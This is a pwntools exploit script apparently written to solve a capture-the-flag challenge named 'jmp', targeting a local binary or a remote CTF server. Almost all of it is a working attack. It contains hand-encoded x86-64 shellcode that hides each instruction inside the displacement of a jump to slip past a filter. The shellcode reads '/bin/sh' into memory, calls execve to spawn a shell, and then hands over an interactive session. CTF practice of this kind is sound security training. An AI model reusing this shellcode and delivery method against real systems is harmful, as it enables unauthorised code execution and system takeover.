#!/usr/bin/env python3
from pwn import *

exe=ELF("./out_patched")

libc = exe.libc
#if args.REMOTE:
#    libc = ELF("./libc.so.6")

HOST, PORT = "jmp.ctf.ingeniums.club", 1337

context.binary = exe

# Constants

GDBSCRIPT = '''\
b* main+157
c
'''
CHECKING = True

def main():
    global io
    io = conn()
    shellcode=b"\xeb\x02" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x48\x89\xe6"# mov rsi, rsp
    shellcode+=b"\xeb\x01" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x48\x83\xc6\x50" # add rsi, 0x50
        
    shellcode+=b"\xeb\x02" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x48\x31\xFF" # xor rdi, rdi
    shellcode+=b"\xeb\x02" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x48\x31\xc0" # xor rax, rax
    shellcode+=b"\xeb\x03" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x00\x6a\x08" #push 0x8 to stack
    shellcode+=b"\xeb\x01" #jmp into displacement of next instruction
    shellcode+=b"\xeb\x5a" #pop rdx

    shellcode+=b"\xeb\x03" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x00\x0f\x05" # syscall    
    
    shellcode+=b"\xeb\x02" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x48\x89\xf7" # mov rdi, rsi
    
    shellcode+=b"\xeb\x03" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x00\x6a\x3b" #push 0x3b to stack
    shellcode+=b"\xeb\x01" #jmp into displacement of next instruction
    shellcode+=b"\xeb\x58" #pop rax
    shellcode+=b"\xeb\x03" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x00\x6a\x00" #push 0 to stack
    shellcode+=b"\xeb\x03" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x00\x6a\x00" #push 0 to stack
    
    shellcode+=b"\xeb\x01" #jmp into displacement of next instruction
    shellcode+=b"\xeb\x5e" #pop rsi

    shellcode+=b"\xeb\x01" #jmp into displacement of next instruction
    shellcode+=b"\xeb\x5a" #pop rdx

    shellcode+=b"\xeb\x03" #jmp into displacement of next instruction
    shellcode+=b"\xe9\x00\x00\x0f\x05" # syscall    
    
    # shellcode+=b"\xeb\x00"# infinite loop
    # shellcode+=b"\xeb\xfe"# infinite loop
    
    sleep(0.1)
    io.send(shellcode)
    
    sleep(0.1)
    
    io.send(b"/bin/sh\x00")
    sleep(0.1)
    
    io.interactive()
    

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT,ssl=True)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
